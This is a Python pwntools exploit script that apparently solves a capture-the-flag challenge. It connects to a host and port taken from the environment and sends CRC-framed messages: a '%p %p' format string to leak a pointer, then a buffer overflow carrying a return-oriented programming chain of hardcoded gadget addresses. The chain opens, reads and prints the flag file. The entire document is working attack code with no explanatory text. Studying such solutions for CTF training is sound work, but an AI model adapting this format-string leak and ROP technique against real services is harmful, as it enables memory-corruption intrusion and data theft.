#!/usr/bin/env python3
from pwn import *
import sys
import logging
import os
import zlib
import struct

context.log_level = 'debug'


def solve(r: remote):

    SYNC = b'\xde\xad\xbe\xef'
    A1 = b'\xa1'
    A2 = b'\xa2'
    B1 = b'\xb1'
    B2 = b'\xb2'

    GADGET1     = b'\xfc\x17\x02\x00'
    FLAG_ADDR   = b'\xb0\xe6\x06\x00'
    FLAG_LEN    = b'\x80\x00\x00\x00'
    STDOUT      = b'\x01\x00\x00\x00'
    MODE        = b'\x00\x00\x00\x00'
    OPEN_FLAGS  = b'\x00\x00\x00\x00'
    FILENAME    = b'\x3c\xc0\x04\x00'
    OPEN_GADGET = b'\x38\x95\x01\x00'
    FILENO      = b'\x03\x00\x00\x00'
    BUFFER      = b'\xb0\xe6\x06\x00'
    READ_GADGET = b'\x88\x18\x02\x00'
    WRITE_GADGET= b'\x14\x19\x02\x00'
    EXIT_GADGET = b'\x10\x12\x01\x00'

    # send in a user string that will leak a pointer when displayed by command B1 below
    command = b'%p %p '
    crc = zlib.crc32(command)

    message = SYNC + A2 + command + struct.pack('<I',crc)

    #sys.stdout.buffer.write(message)
    r.send(message)

    # print the config table to leak a pointer
    command = b'A'*16
    crc = zlib.crc32(command)

    message = SYNC + B1 + command + struct.pack('<I',crc)

    #sys.stdout.buffer.write(message)
    r.send(message)

    # now send in the buffer overflow with the ROP chain
    command = b'A'*116 + \
        GADGET1 + \
        b'B'*4 + \
        MODE + OPEN_FLAGS + FILENAME + \
        b'C'*28 + \
        OPEN_GADGET + \
        b'D'*32 + \
        FILENO + \
        BUFFER + \
        FLAG_LEN + \
        READ_GADGET + \
        STDOUT + \
        BUFFER + \
        FLAG_LEN + \
        WRITE_GADGET + \
        b'E'*12 + \
        EXIT_GADGET
    
    crc = zlib.crc32(command)

    message = SYNC + B2 + command + struct.pack('<I',crc)

    r.send(message)
    flag = r.recvall()

    print(flag)

    logging.info("success :)")
    exit

if __name__ == "__main__":
    # get host from environment
    hostname = os.getenv("CHAL_HOST")
    if not hostname:
        print("No HOST supplied from environment")
        sys.exit(-1)

    # get port from environment
    port = int(os.getenv("CHAL_PORT","0"))
    if port == 0:
        print("No PORT supplied from environment")
        sys.exit(-1)

    
    # get ticket from environment
    ticket = os.getenv("TICKET")

    r = remote( hostname , port )
    
    if ticket is not None:
        # Do a ticket submission
        r.recvuntil(b"Ticket please:")
        r.sendline(bytes(ticket, 'utf-8'))
    
    r.recvuntil("Exploit me!")

    solve(r)
